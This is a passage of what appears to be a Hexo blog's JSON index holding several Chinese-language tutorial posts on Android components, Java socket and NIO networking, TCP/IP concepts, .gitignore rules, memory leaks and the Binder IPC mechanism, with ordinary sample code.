在解码难度方面，XML的解析得考虑子节点父节点，而Json不需要，解析难度较低 Json数据的体积小 Json的传输速度快于XML 但Json也有它不足之处： 没有XML格式这么推广的深入人心和使用广泛, 没有XML那么通用性 命名空间允许不同上下文中的相同的信息段彼此混合，然而在Json中已经找不到了命名空间","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"Head First Java设计模式思维导图总结","slug":"Head-First-Java设计模式思维导图总结","date":"2016-04-30T09:59:31.000Z","updated":"2020-05-11T07:23:44.690Z","comments":true,"path":"2016/04/30/Head-First-Java设计模式思维导图总结/","link":"","permalink":"https://superxlcr.github.io/2016/04/30/Head-First-Java设计模式思维导图总结/","excerpt":"","text":"关于Head First Java设计模式的思维导图总结：","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://superxlcr.github.io/categories/设计模式/"}],"tags":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"},{"name":"设计模式","slug":"设计模式","permalink":"https://superxlcr.github.io/tags/设计模式/"}]},{"title":"Android常见问题总结（二）","slug":"Android常见问题总结（二）","date":"2016-04-24T13:51:06.000Z","updated":"2020-05-11T07:23:44.580Z","comments":true,"path":"2016/04/24/Android常见问题总结（二）/","link":"","permalink":"https://superxlcr.github.io/2016/04/24/Android常见问题总结（二）/","excerpt":"","text":"上一篇文章的传送门：Android常见问题总结（一） 广播的两种注册方法Android四大组件之一的broadcast（广播）拥有两种不同的注册方法：静态注册与动态注册 静态注册广播静态注册指把广播相应的信息写在AndroidManifest.xml中，例子如下： 12345&lt;receiver android:name=\".StaticReceiver\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"XXX\" /&gt; &lt;/intent-filter&gt; &lt;/receiver&gt; 静态广播的好处在于：不需程序启动即可接收，可用作自动启动程序 动态注册广播动态注册指在程序中调用registerReceiver方法来注册广播，例子如下： 123456IntentFilter filter = new IntentFilter(); filter.addAction(\"XXX\"); DynamicReceiver receiver = new DynamicReceiver(); registerReceiver(receiver, filter); // 不使用后记得取消注册 unregisterReceiver(receiver); 动态广播的好处在于：程序适应系统变化做操作，但在程序运行状态才能接收到 Intent的使用Intent即意图，是Android中连接四大组件的枢纽，Android中的Activity、Service和BroadcastReceiver都依靠Intent来启动Intent对象的属性大致包含七种，分别是Component、Action、Category、Data、Type、Extra、Flag ComponentComponent用于明确指定需要启动的目标组件，使用方法如下： 12345Intent intent = new Intent(); // 方法一：传入上下文参数与class参数 intent.setComponent(new ComponentName(context, XXX.class)); // 方法二：传入包名与类名 intent.setComponent(new ComponentName(pkg, cls)); 指定Component属性的Intent已经明确了它将要启动的组件，因此这种Intent也被称为显示Intent，没有指定Component属性的Intent被称为隐试Intent Action、CategoryAction代表Intent所要完成的一个抽象“动作”，而Category则用于为Action增加额外的附加类别信息，它们的使用方法如下： 123456Intent intent = new Intent(); // 设置一个字符串代表Action intent.setAction(action); // 添加一个字符串代表category intent.addCategory(category1); intent.addCategory(category2); 值得注意的是Action属性是唯一的，但Category属性可以有多个。通常设置了Action和Category来启动组件的Intent就不指定Component属性了，因此这种Intent被称为隐试Intent Data、TypeData属性接受一个Uri对象，Data属性通常用于向Action属性提供操作的数据。Type属性用于指定该Data属性所指定Uri对应的MIME类型。它们的使用方法如下： 1234567Intent intent = new Intent(); // 设置Data属性 intent.setData(new Uri()); // 设置Type属性 intent.setType(type); // 同时设置Data和Type属性 intent.setDataAndType(data, type); 值得注意的是Data属性和Type属性会互相覆盖，如果需要同时设置Data属性和Type属性需要使用setDataAndType ExtraIntent的Extra属性用于进行数据交换，Intent的Extra属性值应该是一个Bundle对象（一个类似Map的对象，可以存入多个键值对，但存入的对象必须是基本类型或可序列化的），用法如下： 1234567891011Intent intent = new Intent(); // 直接往Intent添加基本类型，在方法内也是把数据存入Bundle // 该方法有多种重载 intent.putExtra(name, value); // 新建Bundle Bundle bundle = new Bundle(); // 往Bundle添加数据，XXX为基本类型 bundle.putXXX(key, value); bundle.putXXXArray(key, value); // 把Bundle添加进Intent intent.putExtras(bundle); FlagIntent的Flag属性用于为该Intent添加一些额外的控制旗标，Intent可调用addFlags方法来添加控制旗标 ContentProvider使用方法为了在应用程序之间交换数据，Android提供了ContentProvider。当一个应用程序需要把自己的数据暴露给其他程序使用时，该应用程序就可以通过ContentProvider来实现，而其他程序则使用ContentResolver来操作ContentProvider暴露的数据。实现ContentProvider的Java代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142public class MyProvider extends ContentProvider &#123; @Override public boolean onCreate() &#123; // 第一次创建时调用，如果创建成功则返回true // 可以在这里打开数据库什么的 return true; &#125; @Override public String getType(Uri uri) &#123; // 返回ContentProvider所提供数据的MIME类型 return null; &#125; @Override public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) &#123; // 实现查询方法 return null; &#125; @Override public Uri insert(Uri uri, ContentValues values) &#123; // 实现插入方法，返回插入条数 return null; &#125; @Override public int delete(Uri uri, String selection, String[] selectionArgs) &#123; // 实现删除方法，返回删除条数 return 0; &#125; @Override public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) &#123; // 实现更新方法，返回更新条数 return 0; &#125; &#125; 当我们实现了自己的ContentProvider后，还需要去AndroidManifest.xml中注册才行： 1234&lt;provider android:name=\".MyProvider\" android:authorities=\"com.example.test.provider\" android:exported=\"true\" /&gt; 配置ContentProvider时我们需要设置如下属性： name：类名 authorities：为ContentProvider指定一个对应的Uri，其他程序通过这个Uri来找到该ContentProvider exported：允许ContentProvider被其他应用调用 当其他应用需要访问我们提供的ContentProvider的使用，只需使用ContentResolver并传入相应的Uri即可： 1234567891011121314151617public class MyActivity extends Activity &#123; private static String TAG = \"MyActivity\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); ContentResolver resolver = getContentResolver(); // 传入对应的Uri进行增删查改操作 resolver.query(uri, projection, selection, selectionArgs, sortOrder); resolver.insert(url, values); resolver.delete(url, where, selectionArgs); resolver.update(uri, values, where, selectionArgs); &#125; &#125; 除此之外，我们还可以使用ContentObserver来为ContentProvider添加观察者。我们在其他程序的ContentResolver中注册ContentObserver，当ContentProvider发生改变时，我们在数据改动的使用调用： 1getContext().getContentResolver().notifyChange(uri, null); 那么此时ContentObserver中的onChange回调方法就会被调用，我们就可以简单地监听ContentProvider的数据改变了 Thread、AsycTask、IntentService的使用场景与特点Thread、AsyncTask和IntentService都与多线程有关，当我们在Android中涉及并发编程时（进行网络请求、加载较大的文件等操作）就需要使用 ThreadJava中的子线程，可以通过传入Runnable接口或继承Thread重写run方法新建 AsyncTask由Java线程池改造的异步任务工具 IntentServiceAndroid四大组件之一的Service默认是在主线程中运行的，IntentService是Service的子类，有如下特点： IntentService会创建单独的worker线程来处理所有的Intent请求 当所有请求处理完成后，IntentService会自动停止 为Service的onBind方法提供了默认实现，返回null 为Service的onStartCommand方法提供了默认实现，把请求Intent添加到队列中 实现IntentService的例子如下： 12345678910111213public class MyIntentService extends IntentService &#123; public MyIntentService(String name) &#123; super(name); &#125; @Override protected void onHandleIntent(Intent intent) &#123; // IntentService会创建单独的worker线程来处理此处的代码 &#125; &#125; 我们只需重写onHandleIntent方法即可，该方法的代码会在一个子线程中运行 五种Layout各自特点FrameLayoutFrameLayout即单帧布局，在该布局中的所有空间都会被置于布局的左上角 LinearLayoutLinearLayout即线性布局，使用该布局必须为其指定orientation属性（排列方向属性，可以设置为水平或垂直的），其中的空间就会根据设置的属性呈水平或垂直排列 AbsoluteLayoutAbsoluteLayout即绝对布局，对布局中的控件我们使用x，y坐标值进行定位 RelativeLayoutRelativeLayout即相对布局，在其中的控件可以相对于父布局或布局中别的控件的位置进行定位布局 TableLayoutTableLayout即表格布局，TableLayout中的每一行的控件由TableRow包含，最终的布局效果会呈现成表格状","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"Android常见问题总结（一）","slug":"Android常见问题总结（一）","date":"2016-04-22T11:34:56.000Z","updated":"2020-05-11T07:23:44.575Z","comments":true,"path":"2016/04/22/Android常见问题总结（一）/","link":"","permalink":"https://superxlcr.github.io/2016/04/22/Android常见问题总结（一）/","excerpt":"","text":"以下为一些常见的Android的总结 Activity与Fragment的生命周期Activity的生命周期如下图所示： Fragment生命周期如下图所示： Acitivty的四种启动模式与特点Android中的Activity由任务栈管理，当我们start一个新的Activity时，就往任务栈中新加入一个栈帧，而当我们finish一个Activity界面时，则往任务栈中移除一个栈帧Activity具有四种启动模式，我们可以在配置文件中通过修改launchMode修改，启动模式分别是：standard、singleTop、singleTask和singleInstance standardstandard为默认Activity的启动模式。在standard启动模式下，无论何时start一个Activity，系统都会往任务栈中加入一个新的栈帧 singleTop在singleTop启动模式下，当我们start一个Activity时，系统会先去检测任务栈栈顶的Activity和要启动的Activity是否相同。如果相同则不进行任何操作，否则往任务栈中加入一个新的栈帧 singleTask在singleTask启动模式下，当我们start一个Activity时，系统会先去检测任务栈中是否含有将要启动的Activity。如果含有，则把该Activity所在栈帧的顶部的栈帧移除，使该Activity所在的栈帧处在栈顶，如果没有，则新加入一个栈帧 singleInstance在singleInstance启动模式下，当我们start一个新的Activity时，该Activity会在一个新的任务栈中启动 Service的生命周期Android中的Service组件可以通过startService和bindService两种方法来启动，其生命周期示意图如下： 如果一个Service同时被调用了startService和bindService方法，那么它的生命周期就变成如下图所示： 怎么保证service不被杀死要想使Service存活下来，我们就必须保证Service所在的进程不被杀掉，一般来说有以下方法： 在onStartCommand回调方法中返回START_STICKY，那么该进程被杀掉后系统会试图重启它 设置配置文件中application的persistent属性，把应用提升为系统级别应用，免疫low memory killer 在Service的onDestroy方法中重启该Service，不过如果进程被直接杀掉这种方法就无效了 通过监听特殊的系统广播（如屏幕变化、电量变化、网络变化等）去不断重启Service 使用AlarmManager定时重复开启Service 通过设置Service的process属性，把Service放在子进程中，避免与主进程一起被回收 开启一个另外的进程与Service进程互相监视，双方要是有任意一方被杀掉则重启","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"TCP/IP常见问题总结（四）","slug":"TCP-IP常见问题总结（四）","date":"2016-04-17T13:29:06.000Z","updated":"2020-05-11T07:23:44.741Z","comments":true,"path":"2016/04/17/TCP-IP常见问题总结（四）/","link":"","permalink":"https://superxlcr.github.io/2016/04/17/TCP-IP常见问题总结（四）/","excerpt":"","text":"上一篇文章的传送门：TCP/IP常见问题总结（三） C/S模式下使用socket通信客户端的Java代码如下所示： 12345678910111213141516public class Main &#123; public static void main(String[] args) throws Exception &#123; String host = \"\"; int port = 0; Socket socket = new Socket(host, port); // 分别填入目标主机ip和端口 try &#123; // 获取输出流 OutputStream os = socket.getOutputStream(); // 获取输入流 InputStream is = socket.getInputStream(); &#125; finally &#123; // 关闭socket socket.close(); &#125; &#125; &#125; 建立连接后，获取输入输出流进行对应的输入输出即可。服务器的Java代码如下所示： 1234567891011121314151617public class Main &#123; public static void main(String[] args) throws Exception &#123; int port = 0; ServerSocket serverSocket = new ServerSocket(port); // 填入监听的端口号 try &#123; // accept是一个阻塞的方法，阻塞直到返回一个socket连接 Socket socket = serverSocket.accept(); try &#123; // 获取输入输出流进行对应操作 &#125; finally &#123; socket.close(); &#125; &#125; finally &#123; serverSocket.close(); &#125; &#125; &#125; 通过accept获取一个socket连接后类似客户端获取输入输出处理即可。客户端Java NIO代码： 1234567891011121314151617181920212223242526public class Main &#123; public static void main(String[] args) throws Exception &#123; String hostname = \"\"; int port = 0; SocketChannel socketChannel = SocketChannel.open(); // 设置成非阻塞IO socketChannel.configureBlocking(false); try &#123; // 非阻塞模式下可能没建立连接就返回了 while (!socketChannel.finishConnect()) &#123; // 传入目标主机ip和端口号建立连接 socketChannel.connect(new InetSocketAddress(hostname, port)); &#125; int capacity = 48; // 传入缓冲区大小建立缓冲区 ByteBuffer buffer = ByteBuffer.allocate(capacity); // 读取字节输入 int byteRead = socketChannel.read(buffer); &#125; finally &#123; socketChannel.close(); &#125; &#125; &#125; 注意NIO下的连接、读取和写入操作均为非阻塞操作，可能并没有达到我们预料中的结果就返回了，因此切记在循环中使用并进行相应的判断。服务器Java NIO代码： 123456789101112131415161718192021public class Main &#123; public static void main(String[] args) throws Exception &#123; int port = 0; ServerSocketChannel serverSocketChannel = ServerSocketChannel.open(); // 绑定监听端口 serverSocketChannel.bind(new InetSocketAddress(port)); // 设置为非阻塞模式 serverSocketChannel.configureBlocking(false); try &#123; while (true) &#123; SocketChannel socketChannel = serverSocketChannel.accept(); // 非阻塞模式下可能没监听到任何通道就返回了 if (socketChannel != null) &#123; // 获取socket通道后进行对应操作 &#125; &#125; &#125; finally &#123; serverSocketChannel.close(); &#125; &#125; &#125; 由于非阻塞的原因，accept方法不一定成功获取socketChannel，因此我们需要进行判断是否返回了null IP地址分类IP地址分为IPv4地址（32位）和IPv6地址（128位），在此我们讨论IPv4地址。IP地址由两部分（网络部分和主机部分）组成，可以分为有类网和无类网两类。 有类网有类网分为以下5种： 种类 定义 网络地址范围 A类网 第一位为0，后7位为网络号，剩余24位为主机号 1.0.0.0 到 126.0.0.0 有效（0.0.0.0 与 127.0.0.0保留） B类网 前两位为10，后14位为网络号，剩余16位为主机号 128.1.0.0 到 191.254.0.0 有效（128.0.0.0 与 191.255.0.0保留） C类网 前三位为110，后21位为网络号，剩余8位为主机号 192.0.1.0 到 223.255.254.0 有效（192.0.0.0 与 223.255.255.0保留） D类网（不可用） 前四位为1110，后28位为多播地址 224.0.0.0 到 239.255.255.255 用于多点广播 E类网（不可用） 前四位为1111，被保留 240.0.0.0 到 255.255.255.254 保留（255.255.255.255用于广播） 除了D类网与E类网不能使用外，A、B和C类网IP均可用来表示一台主机。我们一般根据自己网络中主机的多少来选择A、B还是C类网，但一般而言网路中的主机数目都不会刚好等于有类网提供的主机数，于是经常会造成有多余的IP地址浪费，因此我们有了无类网 无类网无类网加入了子网掩码的概念。子网掩码是一个32位地址，用于将某个IP地址划分成网络地址和主机地址两部分。在子网掩码中我们以1表示为网络号，例：255.255.255.0表示前24位为网络号 路由器与交换机区别路由器工作于网络模型的网络层，其主要的功能是路由选择与存储转发，路由器上还能开启ACL访问控制列表、NAT地址转换等功能，扩展网络应用交换机工作于网络模型的数据链路层，其主要的功能是泛洪、存储转发、过滤和自学习，交换机还能够隔离冲突域，并划分VLAN","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"Http","slug":"Http","permalink":"https://superxlcr.github.io/tags/Http/"},{"name":"TCP","slug":"TCP","permalink":"https://superxlcr.github.io/tags/TCP/"}]},{"title":"关于.gitignore中!使用的注意事项","slug":"关于-gitignore中-使用的注意事项","date":"2016-04-16T09:33:48.000Z","updated":"2020-05-11T07:23:44.814Z","comments":true,"path":"2016/04/16/关于-gitignore中-使用的注意事项/","link":"","permalink":"https://superxlcr.github.io/2016/04/16/关于-gitignore中-使用的注意事项/","excerpt":"","text":"最近博主设置github的.gitignore文件时遇到了一些有趣的问题，在此写一篇博客记录一下。 github提供了.gitignore配置文件用于配置不需要加入版本管理的文件，其配置语法如下： 以斜杠“/”开头表示目录 支持用正则表达式来匹配 以叹号“!”表示不忽略(跟踪)匹配到的文件或目录 举博主的例子来说，博主的.gitignore所在目录如下： 博主打算把文件配置为仅追踪.gitignore与build/outputs/apk中的所有文件，其余文件全部忽略，因此开始时的.gitignore写为： 12/build !/build/outpus/apk 结果却发现github把整个build文件夹都给忽略掉了……把!那一句移到第一行也无济于事。在经过辛苦的百度搜索后，终于找到了答案，在stackOverflow上有对此类问题的回答：http://stackoverflow.com/questions/5533050/gitignore-exclude-folder-but-include-specific-subfolder 博主对此问题的理解是，要想追踪某个文件或文件夹，必须确保其父文件夹也被追踪，如果其父文件夹被忽略了，那么该文件自然被忽略掉了。将.gitignore文件改为如下后成功实现了博主想要的效果： 1234build/* !/build/outputs /build/outputs/* !/build/outputs/apk 其效果图如下（绿色代表github追踪文件）：","categories":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/tags/git/"}]},{"title":"TCP/IP常见问题总结（三）","slug":"TCP-IP常见问题总结（三）","date":"2016-04-15T03:19:14.000Z","updated":"2020-05-11T07:23:44.737Z","comments":true,"path":"2016/04/15/TCP-IP常见问题总结（三）/","link":"","permalink":"https://superxlcr.github.io/2016/04/15/TCP-IP常见问题总结（三）/","excerpt":"","text":"上一篇文章的传送门：TCP/IP常见问题总结（二） Http怎么处理长连接长连接，指在一个连接上可以连续发送多个数据包，在连接保持期间，如果没有数据包发送，需要双方发链路检测包。Http协议是一个短连接、无状态的基于TCP的协议，默认的流程是：建立连接–&gt;发送请求–&gt;响应请求–&gt;断开连接。在Http1.1中加入了保持长连接的功能，可以通过Http头域属性Connection:keep-alive开启。另外，我们也可以使用Http轮询来模拟长连接的过程。 Cookie与Session的作用与原理由于Http协议是一种短连接的、无状态的协议，因此如果我们一般无法获取客户端以前的请求信息与状态信息。为了解决这个问题，保存请求的状态，Cookie和Session出现了。简单来说，Cookie存于客户端，而Session存于服务器，它们都保存和用户历史请求相关的信息。在发送Http请求时Cookie或SessionId会随被加入请求参数中一起发给服务器，服务器根据Cookie的信息或SessionId查找到的Session信息来得知客户端的状态信息，进而进行进一步的相关操作。 Cookie cookie被存储于客户端 cookie在RFC有定义 与cookie相关的头域参数有cookie和set-cookie Session session被存储与服务器 session并没有在Http协议中有明确的定义 session通过sessionId来区分不同的用户 与cookie相比，存储在服务器的session显得更为安全 session通常的实现方法有两种： 通过cookie实现，在cookie中存储sessionId 回写URL实现，在网页的连接中加入sessionId 电脑上访问一个网页的整个过程是怎么样的：DNS、HTTP、TCP、OSPF、IP、ARP在电脑上访问一个网页主要有一下步骤： 我们在浏览器中输入网址，但电脑并不认识如此复杂的字符串，因此电脑使用DNS服务解析出对应的IP地址 访问网页的过程基于Http协议，因此我们访问网页的过程实际上就是Http协议发送请求和响应请求的过程 Http协议是应用层协议，它基于传输层的TCP协议，TCP协议描述了进程与进程间如何通信交流，把具体的传输过程交给下层的网络层 网络层由IP协议控制数据包的路由选择和存储转发，但由于网络上的主机太多，IP协议管理不过来，因此又把网络主机分为多块，在外部使用EGP外部网关协议，在内部使用IGP内部网关协议（包括RIP协议与OSPF协议） 当网络层的数据传输到以太网后，就通过ARP协议获取目标主机的MAC地址，最后把数据传输的任务交给数据链路层处理 ICMP报文与Ping的整个过程ICMP即Internet Control Message Protocol，网络控制报文协议，是一个网络层的用于在IP主机、路由器之间传递控制消息的协议。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。其中Ping是ICMP协议中的指令之一，其主要作用的是检查网络的连通情况和检测网络的速度。Ping的过程主要有如下步骤： 检查本地ARP缓存，查找目标主机的MAC地址 如果没有找到MAC地址，使用ARP协议获取目标主机MAC地址，并放入ARP缓存 发出ICMP echo request包，接收ICMP echo reply包","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"},{"name":"Http","slug":"Http","permalink":"https://superxlcr.github.io/tags/Http/"},{"name":"TCP","slug":"TCP","permalink":"https://superxlcr.github.io/tags/TCP/"}]},{"title":"Android防止内存泄露小结","slug":"Android防止内存泄露小结","date":"2016-04-13T09:46:33.000Z","updated":"2020-05-11T07:23:44.654Z","comments":true,"path":"2016/04/13/Android防止内存泄露小结/","link":"","permalink":"https://superxlcr.github.io/2016/04/13/Android防止内存泄露小结/","excerpt":"","text":"内存泄露，通俗的讲就是：申请了内存空间不再使用后没有释放掉，结果导致该部分内存空间一直被占据的现象。内存泄露很明显是对内存空间的一种浪费，更严重的是，在内存较为紧张的嵌入式设备上如果频繁地发生内存泄露，可能会最终导致OOM（内存溢出），进而使程序崩溃。 在Android编程时为了避免内存泄露，我们应该注意以下地方： 具有close方法的对象切记调用close方法释放资源常见的有Cursor和各种流等对象。博主就曾经因为Cursor对象忘记close，在进行了多次数据库查询后APP就因为OOM而崩溃了。 动态注册的广播不使用后记得取消注册取消注册后可释放Context中持有的相关的广播过滤器资源。 bitmap的recycle方法在Android3.0版本以前，bitmap对象的构造涉及到JVM的两块内存区域：一块是Bitmap对象所在的Java堆，一块是Bitmap对象持有的native层资源所在的Native堆。在Java堆上分配的资源由于JVM的GC机制的关系我们不需要去特别关心，但在Native堆上分配的资源就需要我们显式地调用bitmap的native方法recycle去回收了。然而在Android 3.0版本后bitmap内存资源分配都在Java堆上，因此是否调用recycle方法对内存影响就不大了。 listView的Adapter中注意convertView的使用在Adapter的getView方法中，有一个重要的参数就是convertView。convertView是一个View参数，它代表了一个回收的View（如果没有就为null）。Android的ListView虽然看起来有很多项，但其实真正的ItemView的数目只有屏幕上显示的哪几个，当一个ItemView从可见变为不可见时，他就会被回收掉，在下次调用getView方法时传入的convertView就是某个被回收的View。因此在getView方法中，当convertView不为null时，我们应该使用convertView而不是重新创建一个View。更高效的方式是把convertView结合一个自定义的ViewHolder一起使用，可以有效的减少findViewById的时间。 handlerHandler常见的应用场景是多线程的通信，此时要是Handler使用不当就相当容易造成内存泄露。在多线程通信的场景下，子线程通常都会持有Handler对象的引用，如果一个Handler对象在Activity中不是静态的，那么该Handler对象就会持有该Activity对象的引用，从而导致Activity组件无法正常的被GC回收，导致了内存泄露。因此一般而言我们应该把Handler对象置为Activity中的静态变量，通过软引用或者弱引用的方式来获取Activity及其内部域，避免持有Activity的强引用导致该组件无法回收。 集合对象清理对于一些集合中不再使用的对象，我们应该把它们移除出我们的集合。避免由于集合持有那些对象的引用导致它们无法被JVM的GC所回收。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"}]},{"title":"Android闹钟app提醒界面属性小结","slug":"Android闹钟app提醒界面属性小结","date":"2016-04-08T07:55:54.000Z","updated":"2020-05-11T07:23:44.654Z","comments":true,"path":"2016/04/08/Android闹钟app提醒界面属性小结/","link":"","permalink":"https://superxlcr.github.io/2016/04/08/Android闹钟app提醒界面属性小结/","excerpt":"","text":"前些日子回顾到自己以前实现的一款闹钟APP，发现其中的提醒界面（即一个时间到了的闹钟界面）有许多以前没有注意到的细节，因此在此写下一篇小结。 闹钟界面的xml代码如下： 12345678&lt;activity android:name=\".AlarmActivity\" android:configChanges=\"orientation|keyboardHidden|keyboard|navigation\" android:excludeFromRecents=\"true\" android:label=\"@string/app_name\" android:launchMode=\"singleInstance\" android:theme=\"@android:style/Theme.Wallpaper.NoTitleBar\" &gt; &lt;/activity&gt; 以下针对关键属性进行解释： configChanges 一般而言，当一个Activity界面横竖屏切换了以后，整个Activity会重新加载来重启一次Activity以适应变化。但对于我们的闹钟界面而言，我们当然不希望当用户切横竖屏时，整个界面就被重新加载了。因此我们在configChanges属性上表示出这些改变的事件，在configChanges上标识的事件发生时不会导致Activity重新加载，而是调用onConfigurationChanged这个回调方法来处理。值的注意的是，网上有资料说明：自从Android 3.2（API 13），在设置Activity的android:configChanges=”orientation|keyboardHidden”后，还是一样 会重新调用各个生命周期的。因为screen size也开始跟着设备的横竖切换而改变。所以，在AndroidManifest.xml里设置的MiniSdkVersion和 TargetSdkVersion属性大于等于13的情况下，如果我们想阻止程序在运行时重新加载Activity，除了设置”orientation”， 我们还必须设置”ScreenSize” excludeFromRecents 这个属性设置为true之后，该Activity的运行将不会使应用出现在最近运行的列表上。设置该属性的理由很简单，如果用户很久以前设置了一个闹钟，刚刚突然响了，我们总不能就认为用户刚刚才使用了我们的应用吧。 launchMode 这是属性是控制Activity的启动模式的属性，有四种属性可选。此处我们选择的启动模式为singleInstance，即把这个Activity分配到一个独立的任务栈中去。为什么要这么做呢？我也是一次偶然的机会发现了这么一个情景：假设用户设置了一个闹钟后，并没有关闭应用，而是回到桌面转到别的应用中去了。那么如果在闹钟应用进程没有被回收之前，闹钟响了，触发了闹钟界面，此时关闭闹钟界面后就有可能出现问题。如果闹钟界面的启动模式不是singleInstance，那么关闭闹钟界面后留下的极有可能是用户之前没有关闭的设置闹钟的界面，而不是用户在闹钟响起之前所浏览的界面了。 从上面的总结可以看出，一个小小的闹钟界面也是有很大的讲究的。对于应用的设计我们需要关注很多细节的东西，最后才能创造出一款精致的作品。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"深入理解Android之Binder通信机制","slug":"深入理解Android之Binder通信机制","date":"2016-04-08T02:26:49.000Z","updated":"2020-05-11T07:23:44.859Z","comments":true,"path":"2016/04/08/深入理解Android之Binder通信机制/","link":"","permalink":"https://superxlcr.github.io/2016/04/08/深入理解Android之Binder通信机制/","excerpt":"","text":"最近看《深入理解Android卷I》了解了一些有关于Binder通信的知识，在此写一篇博客作为总结。 概述Binder是Android系统提供的一种IPC（进程间通信）机制。对于Android系统，我们基本上可以把它看做一个基于Binder通信的C/S架构，Binder就像网络一样，把系统的各个部分连接在了一起，因此它是非常重要的。在Android系统的C/S架构中除了Client端和Server端外，还有一个全局的ServiceManager端，其作用是管理系统中的各种服务，三者的关系如下图： 其中： 对于ServiceManager而言：Client与Server都是客户端 对于Client而言：ServiceManager与Server都是服务端 对于Server而言：Client是客户端，而ServiceManager是服务端 Binder提供的作用就是上图中黑线的连接作用。 BinderBinder的通信结构分为三层，如下图所示： 虚拟设备层在Linux中，Android通过kernel/drivers/staing/android/binder.c文件实现了一个虚拟设备Binder用于通信。由于博主对Linux了解不深，此处不再深入讨论。 通信层通信层主要有两个类：BpBinder客户端代理与BBinder服务器代理，两个类均派生自IBinder类。通信层的主要任务是把业务层传来的数据通过与Binder设备交互发送给目标进程，其最主要的方法为transact方法。以BpBinder为例，其工作示意图如下： 从上图可以看到，BpBinder的transact方法把通信的任务交给了IPCThreadState。 IPCThreadState是一个线程私有的变量，它被每个线程存储在TLS（Thread Local Storage）中。IPCThreadState中主要含有mIn和mOut两个缓冲区，分别用于存储从Binder接收的数据及需要发往Binder的数据。 IPCThreadState调用方法talkWithDriver后最终使用Linux的ioctl方法来与Binder设备进行通信。 补充：构造BpBinder时需要传入一个handle数值表示与其对应的BBinder。 业务层业务层主要包括BpServiceXXX和BnServiceXXX，其中XXX会随服务器提供的服务不同而变化，由于业务层经过了层层封装，类关系较为复杂，在此不深入讨论。 Server了解Binder是如何在两个进程间进行通信之后，我们来看看C/S架构中Server是如何工作的。Server的工作示意图如下： 下面是对上图的每个步骤的解释： 初始化processState：在初始化的过程中我们打开了binder虚拟设备，并使用mmap为其分配了内存，由于processState是一个用了单例模式实现的类，因此每个进程只会打开设备一次 getDefaultServiceManager：顾名思义，获取ServiceManager。由于Server此时是作为客户端，因此得到了BpServiceManager，BpServiceManager中含有BpBinder，其传入的handle为0，代表ServiceManager的BBinder。 instantiate：使用BpServiceManager的addService方法注册服务，以字符串标识自己的服务 startThreadPool：这是一个可选的操作，当系统认为服务可能较为繁忙时才会创建多个线程，会为每个线程设置IPCThreadState（用于通信），创建完后调用joinThreadPool joinThreadPool：把当前线程加入线程池中，监听来自客户端的请求并处理，得到请求后通过executeCommand方法来处理 ServiceManager看完了Server执行的工作后，我们再来看看ServiceManager这个服务总管会做什么。ServiceManager的工作示意图如下： ServiceManger的工作只有3步： binder_open：顾名思义，就是打开binder设备，与Server在processState初始化时进行的操作类似 binder_become_contextt_manager：通过ioctl把自己的handle值设置为0，代表独一无二的Manager binder_loop：进入一个循环监听请求，并作出响应的处理 值得注意的是：不是所有Server进程都能往ServiceManager中注册服务的，只有root或system级别的进程才有注册服务的权限。但ServiceManager中还维护了一个allowed的白名单，上面注明了那些服务是允许被注册的，这些服务可以被任意Server进程注册。 通过上面我们不难发现，Android引入ServiceManager端的主要目的如下： ServiceManager能集中管理系统内的所有服务，它能施加权限控制，规定哪些服务可以注册哪些不可以 允许Client通过字符串名来查找对应的服务，提供一个类似于DNS的功能 由于各种原因Server进程可能生死无常，如果要Client单独去检查未免压力太大，此时Client只需要查询ServiceManager就能知道关于Server进程的最新消息 Client有了ServiceManager端与Server端的精心准备后，Client使用服务就简单多了。Client使用服务只需要分为两步就好： 通过defaultServiceManager方法获取ServiceManager 通过ServiceManager的getService方法传入字符串获取相应的服务并操作 Android使用Binder通信的原因传输性能方面常见IPC对比： IPC方式 数据拷贝次数 共享内存 0 Binder 1 Socket/管道/消息队列 2 共享内存虽不需要数据拷贝，但要处理进程间的同步问题，控制复杂，较难使用。因此从传输性能上来看，Binder是个不错的选择。而且Binder基于C/S架构，与共享内存相比，Binder架构清晰明朗，Server端与Client端相对独立，稳定性较好。 